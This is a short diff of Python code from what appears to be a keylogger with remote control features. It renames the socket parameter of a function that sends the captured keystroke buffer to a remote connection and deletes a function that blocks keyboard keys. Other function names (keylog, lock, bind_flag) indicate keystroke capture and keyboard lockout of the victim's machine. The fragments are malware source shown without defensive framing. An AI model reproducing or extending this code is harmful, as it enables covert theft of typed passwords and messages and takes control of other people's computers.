@@ -21,9 +21,9 @@ def keylogger(key):
     return
 
 
-def show(client):
+def show(main_connect):
     global buffer
-    client.sendall(buffer.encode(FORMAT))
+    main_connect.sendall(buffer.encode(FORMAT))
     buffer = ""
     return
 
@@ -45,17 +45,6 @@ def lock():
             keyboard.unblock_key(i)
         lock_flag = 0
     return
-
-def lock_2():
-    global lock_flag
-    for i in range(150):
-        if lock_flag == 0:
-            keyboard.block_key(i)
-        else:
-            keyboard.unblock_key(i)
-    lock_flag = 1
-    return
-
 
 def keylog(main_connect):
     global buffer, cmd_flag, lock_flag, bind_flag
